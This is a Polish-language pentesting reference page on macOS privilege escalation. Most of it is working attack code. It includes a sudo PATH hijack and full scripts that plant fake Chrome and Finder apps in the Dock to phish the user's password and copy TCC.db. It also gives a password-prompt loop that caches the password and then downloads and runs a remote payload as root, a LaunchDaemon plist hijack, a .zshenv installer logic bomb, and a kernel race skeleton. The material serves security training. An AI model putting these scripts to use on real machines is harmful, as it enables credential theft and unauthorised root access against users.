# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Jeśli szukasz informacji o TCC privilege escalation, przejdź do:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Pamiętaj, że **większość trików dotyczących privilege escalation mających wpływ na systemy Linux/Unix będzie miała również wpływ na maszyny MacOS**. Zobacz więc:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interakcja z użytkownikiem

### Sudo Hijacking

Oryginalną [technikę Sudo Hijacking znajdziesz w artykule Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Jednak macOS **zachowuje** `PATH` użytkownika, gdy wykonuje on **`sudo`**. Oznacza to, że innym sposobem przeprowadzenia tego ataku byłoby **przejęcie innych plików binarnych**, które ofiara nadal wykonuje podczas **uruchamiania sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Zauważ, że użytkownik korzystający z terminala z bardzo dużym prawdopodobieństwem będzie miał **Homebrew installed**. Możliwe jest więc przejęcie binariów w **`/opt/homebrew/bin`**.

### Impersonacja Docka

Wykorzystując **social engineering**, możesz **impersonate**, na przykład, Google Chrome w Docku i faktycznie wykonać własny skrypt:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Kilka sugestii:

- Sprawdź w Docku, czy znajduje się tam Chrome, a jeśli tak, **usuń** ten wpis i **dodaj** **fake** wpis Chrome w **tym samym miejscu** w tablicy Docka.

<details>
<summary>Skrypt impersonacji Chrome w Docku</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Kilka sugestii:

- **Nie możesz usunąć Finder z Dock**, więc jeśli zamierzasz dodać go do Dock, możesz umieścić fałszywy Finder tuż obok prawdziwego. W tym celu musisz **dodać wpis fałszywego Finder na początku tablicy Dock**.
- Inną opcją jest nieumieszczanie go w Dock i zwykłe jego otwarcie — komunikat „Finder chce kontrolować Finder” nie jest aż tak dziwny.
- Inną opcją, aby **eskalować uprawnienia do root bez pytania** o hasło za pomocą przerażającego okna, jest sprawienie, aby Finder rzeczywiście poprosił o hasło w celu wykonania uprzywilejowanej akcji:
- Poproś Finder o skopiowanie nowego pliku **`sudo`** do **`/etc/pam.d`**. (Monit z prośbą o hasło będzie wskazywał, że „Finder chce skopiować sudo”).
- Poproś Finder o skopiowanie nowego **Authorization Plugin**. (Możesz kontrolować nazwę pliku, aby monit z prośbą o hasło wskazywał, że „Finder chce skopiować Finder.bundle”).

<details>
<summary>Skrypt podszywania się pod Finder w Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware często nadużywa interakcji z użytkownikiem, aby **przechwycić hasło umożliwiające użycie sudo** i programowo je ponownie wykorzystać. Typowy przebieg:

1. Zidentyfikuj zalogowanego użytkownika za pomocą `whoami`.
2. **Powtarzaj monity o hasło** do momentu, aż `dscl . -authonly "$user" "$pw"` zwróci sukces.
3. Zapisz dane uwierzytelniające w cache (np. `/tmp/.pass`) i wykonuj uprzywilejowane działania za pomocą `sudo -S` (hasło przez stdin).

Przykładowy minimalny łańcuch:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Skradzione hasło można następnie ponownie wykorzystać do **wyczyszczenia kwarantanny Gatekeeper za pomocą `xattr -c`**, skopiowania LaunchDaemons lub innych uprzywilejowanych plików oraz nieinteraktywnego uruchamiania kolejnych etapów.

## Nowsze wektory specyficzne dla macOS (2023–2025)

### Przestarzałe `AuthorizationExecuteWithPrivileges` nadal działa

`AuthorizationExecuteWithPrivileges` zostało oznaczone jako przestarzałe w wersji 10.7, ale **nadal działa w Sonoma/Sequoia**. Wiele komercyjnych updaterów wywołuje `/usr/libexec/security_authtrampoline` z niezaufaną ścieżką. Jeśli docelowy plik binarny jest zapisywalny przez użytkownika, możesz podstawić trojana i wykorzystać legalny monit:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Połącz z **masquerading tricks above**, aby zaprezentować wiarygodne okno dialogowe hasła.


### Triage uprzywilejowanego helpera / XPC

Wiele współczesnych third-party macOS privescs działa według tego samego schematu: **root LaunchDaemon** udostępnia **Mach/XPC service** z **`/Library/PrivilegedHelperTools`**, a następnie helper albo **nie waliduje klienta**, waliduje go **zbyt późno** (PID race), albo udostępnia **root method**, która korzysta ze **ścieżki/skryptu kontrolowanego przez użytkownika**. To bug class leżąca u podstaw wielu niedawnych helper bugs w klientach VPN, launcherach gier i updaterach.<sup>[[4]](#references)</sup>

Szybka checklista triage:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Zwróć szczególną uwagę na helpery, które:

- nadal akceptują żądania **po odinstalowaniu**, ponieważ zadanie pozostało załadowane w `launchd`
- wykonują skrypty lub odczytują konfigurację z **`/Applications/...`** albo innych ścieżek zapisywalnych przez użytkowników innych niż root
- polegają na walidacji peerów opartej na **PID** lub wyłącznie na **bundle-id**, którą można potencjalnie wykorzystać w race condition

Więcej informacji o błędach autoryzacji helperów znajdziesz na [tej stronie](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Dziedziczenie środowiska skryptów PackageKit (CVE-2024-27822)

Do czasu naprawienia tego problemu przez Apple w wersjach **Sonoma 14.5**, **Ventura 13.6.7** i **Monterey 12.7.5**, instalacje inicjowane przez użytkownika za pomocą **`Installer.app`** / **`PackageKit.framework`** mogły wykonywać skrypty PKG jako root w środowisku bieżącego użytkownika. Oznacza to, że pakiet używający **`#!/bin/zsh`** ładowałby **`~/.zshenv`** atakującego i uruchamiał go jako **root**, gdy ofiara instalowała pakiet.<sup>[[3]](#references)</sup>

Jest to szczególnie interesujące jako **logic bomb**: wystarczy uzyskać foothold na koncie użytkownika i mieć zapisywalny plik startowy powłoki, a następnie czekać, aż użytkownik uruchomi dowolny podatny instalator oparty na **zsh**. Zasadniczo nie dotyczy to wdrożeń **MDM/Munki**, ponieważ są one uruchamiane w środowisku użytkownika root.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Jeśli chcesz dokładniej poznać wykorzystywanie specyficzne dla installerów, sprawdź również [tę stronę](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Hijacking LaunchDaemon plist (CVE-2025-24085 pattern)

Jeśli LaunchDaemon plist lub jego cel `ProgramArguments` jest **zapisywalny przez użytkownika**, możesz uzyskać eskalację uprawnień, podmieniając go, a następnie wymuszając przeładowanie przez launchd:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Ten schemat exploita odzwierciedla opublikowany exploit dla **CVE-2025-24085**, w którym zapisywalny plist został wykorzystany do wykonania kodu atakującego jako root.

### Wyścig poświadczeń XNU SMR (CVE-2025-24118)

**race w `kauth_cred_proc_update`** pozwala lokalnemu attackerowi uszkodzić wskaźnik poświadczeń tylko do odczytu (`proc_ro.p_ucred`) poprzez wykonywanie pętli `setgid()`/`getgid()` w wielu wątkach aż do wystąpienia rozdartego `memcpy`. Pomyślne uszkodzenie zapewnia **uid 0** oraz dostęp do pamięci kernela. Minimalna struktura PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Połącz to z heap grooming, aby umieścić kontrolowane dane w miejscu, z którego wskaźnik jest ponownie odczytywany. W podatnych buildach zapewnia to niezawodny **local kernel privesc** bez wymogu omijania SIP.<sup>[[2]](#references)</sup>

### SIP bypass via Migration Assistant ("Migraine", CVE-2023-32369)

Jeśli masz już root, SIP nadal blokuje zapisy w lokalizacjach systemowych. Bug **Migraine** wykorzystuje entitlement Migration Assistant `com.apple.rootless.install.heritable` do uruchomienia procesu potomnego, który dziedziczy SIP bypass i nadpisuje chronione ścieżki, np. `/System/Library/LaunchDaemons`.<sup>[[1]](#references)</sup> Łańcuch wygląda następująco:

1. Uzyskaj root na działającym systemie.
2. Wywołaj `systemmigrationd` ze spreparowanym stanem, aby uruchomić binarkę kontrolowaną przez atakującego.
3. Użyj odziedziczonego entitlementu do zmodyfikowania plików chronionych przez SIP, uzyskując persistence nawet po restarcie.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Wiele daemonów Apple akceptuje obiekty **NSPredicate** przez XPC i sprawdza wyłącznie pole `expressionType`, które jest kontrolowane przez atakującego. Tworząc predicate, który wykonuje dowolne selectory, można uzyskać **code execution w usługach root/system XPC** (np. `coreduetd`, `contextstored`). W połączeniu z początkowym app sandbox escape zapewnia to **privilege escalation bez promptów użytkownika**. Szukaj endpointów XPC, które deserializują predicates i nie mają solidnego visitor.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Każdy użytkownik** (nawet nieuprzywilejowany) może utworzyć i zamontować snapshot Time Machine z opcją `-o noowners` oraz **uzyskać dostęp do WSZYSTKICH plików** tego snapshota, omijając sprawdzanie własności na aktywnym woluminie. Jedynym wymaganym uprawnieniem jest posiadanie przez używaną aplikację (np. `Terminal`) uprawnienia **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Polecenia i pełne wyjaśnienie znajdują się na stronie TCC bypasses:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

Może to być przydatne do eskalacji uprawnień:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [1] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
